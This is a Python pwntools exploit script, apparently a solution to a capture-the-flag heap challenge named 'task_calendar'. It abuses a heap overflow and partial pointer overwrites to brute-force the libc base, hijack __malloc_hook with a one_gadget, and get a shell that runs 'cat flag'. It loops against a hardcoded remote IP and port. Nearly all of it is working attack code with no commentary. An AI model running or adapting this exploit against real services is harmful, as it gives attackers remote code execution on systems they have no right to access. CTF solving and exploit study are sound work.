from pwn import *
context(arch = 'amd64', os = 'linux', endian = 'little')
#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

def add(p, index, size):
	p.recvuntil('choice> ')
	p.sendline('1')
	p.recvuntil('choice> ')
	p.sendline(str(index + 1))
	p.recvuntil('size> ')
	p.sendline(str(size))

def edit(p, index, size, data):
	p.recvuntil('choice> ')
	p.sendline('2')
	p.recvuntil('choice> ')
	p.sendline(str(index + 1))
	p.recvuntil('size> ')
	p.sendline(str(size))
	p.recvuntil('info> ')
	p.send(data)

def remove(p, index):
	p.recvuntil('choice> ')
	p.sendline('3')
	p.recvuntil('choice> ')
	p.sendline(str(index + 1))

def get_base(p):
    with open('/proc/' + str(pidof(p)[0]) + '/maps') as f:
        data = f.read()
    with open('/proc/' + str(pidof(p)[0]) + '/environ') as f:
        environ = f.read()
    if 'LD_PRELOAD' not in environ:
        libcPath = os.readlink('/')
    else:
    	libcPath = 'libc.so.6'
    libcBase = -1
    if libcBase < 0:
        for i in data.split('\n'):
            if libcPath in i and 'r-xp' in i:
                libcBase = int(i[ : i.index('-')], 16)
                break
    return libcBase

def GameStart(p):
	# if debug == 1:
	# 	p = process('./task_calendar', env = {'LD_PRELOAD' : './libc.so.6'})
	# 	gdb.attach(p, '\nc')
	# else:
	# 	p = remote(ip, port)
	p.recvuntil('e> ')
	p.sendline('w1tcher')
	libc_base = 0xb42000
	# libc_base = get_base(p) & 0xfff000
	log.info('libc base is : ' + hex(libc_base))
	malloc_hook = 0x3c4b10
	# one_gadget = 0x45216
	# one_gadget = 0x4526a
	# one_gadget = 0xf02a4
	one_gadget = 0xf1147
	add(p, 0, 0x68)
	add(p, 0, 0x68)
	add(p, 0, 0x18)
	add(p, 1, 0x60)
	add(p, 2, 0x60)
	add(p, 2, 0x60)
	edit(p, 0, 0x18, '\x00' * 0x18 + '\xe1')
	remove(p, 1)
	add(p, 0, 0x60)
	add(p, 1, 0x60)
	edit(p, 0, 2, p64(libc_base + malloc_hook - 0x23)[0 : 3])
	remove(p, 1)
	remove(p, 2)
	edit(p, 2, 1, '\n')
	add(p, 1, 0x60)
	add(p, 0, 0x60)
	add(p, 0, 0x60)
	remove(p, 1)
	edit(p, 1, 7, p64(0))
	add(p, 1, 0x60)

	add(p, 1, 0x60)
	add(p, 1, 0x40)
	edit(p, 1, 0x40 - 1, p64(0) * 6 + p64(0) + p64(0x71))
	add(p, 1, 0x60)
	edit(p, 1, 0x60 - 1, p64(0) * 8 + p64(0x50) + p64(0x20) + p64(0) + p64(0x71))
	add(p, 2, 0x60)
	add(p, 3, 0x60)
	remove(p, 3)
	remove(p, 2)
	edit(p, 2, 1, '\n')
	add(p, 2, 0x60)
	add(p, 2, 0x60)
	edit(p, 2, 0x10 - 1, p64(0) + p64(0xe1))
	remove(p, 1)
	edit(p, 2, 0x1b - 1, p64(0) + p64(0x51) + p64(0) + p64(libc_base + malloc_hook - 0x10)[0 : 3])
	add(p, 3, 0x40)
	edit(p, 0, 0x16 - 1, '\x00' * 0x13 + p64(libc_base + one_gadget)[0 : 3])
	add(p, 3, 0x40)
	p.sendline('cat flag')
	p.sendline('cat flag')
	p.sendline('cat flag')
	p.interactive()

if __name__ == '__main__':
	debug = 0
	while True:
		try:
			if debug == 1:
				p = process('./task_calendar', env = {'LD_PRELOAD' : './libc.so.6'})
				# gdb.attach(p, '\nc')
			else:
				p = remote('117.78.40.144', 31274)
			GameStart(p)
		except Exception as e:
			# raise e
			p.close()